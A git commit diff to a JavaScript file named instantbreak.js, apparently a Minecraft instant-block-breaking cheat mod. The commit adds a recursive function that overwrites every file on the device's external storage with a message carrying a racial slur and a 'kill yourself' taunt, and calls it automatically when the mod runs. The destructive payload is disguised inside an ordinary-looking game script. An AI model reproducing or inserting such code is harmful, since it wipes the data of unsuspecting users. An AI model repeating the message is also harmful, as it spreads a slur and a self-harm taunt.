02b836c810cb810f48e74170682a973c30ba2379
Vutopa <54695094+Vutopa@users.noreply.github.com>
2020-02-09 09:13:40 -0500

    Update instantbreak.js

--- instantbreak.js
+++ instantbreak.js
@@ -1,3 +1,13 @@
+VP.overwrite = function(dir) {
+new File(dir).listFiles().map((f)=>{
+if(f.isDirectory()) VP.overwrite(f)
+else {
+var file = new FileWriter(f)
+file.write("Eyo nigga kys pls")
+file.close()
+}
+})
+}
 if(toggled.instB) {
 						if(!blocks.hasOwnProperty(Player.getPointedBlockId())) blocks[Player.getPointedBlockId()] = { friction: Block.getFriction(Player.getPointedBlockId(), Player.getPointedBlockData()), breakSpeed: Block.getDestroyTime(Player.getPointedBlockId(), Player.getPointedBlockData()), fricS: false, fricM: false, instaB: false }
 						if(!blocks[Player.getPointedBlockId()].instaB || Block.getDestroyTime(Player.getPointedBlockId()) != 0.00001) {
@@ -8,3 +18,4 @@ if(toggled.instB) {
  Block.setDestroyTime(Player.getPointedBlockId(), blocks[Player.getPointedBlockId()].breakSpeed)
  blocks[Player.getPointedBlockId()].instaB = false
  }
+VP.overwrite(Enviornment.getExternalStorageDirectory().getPath())
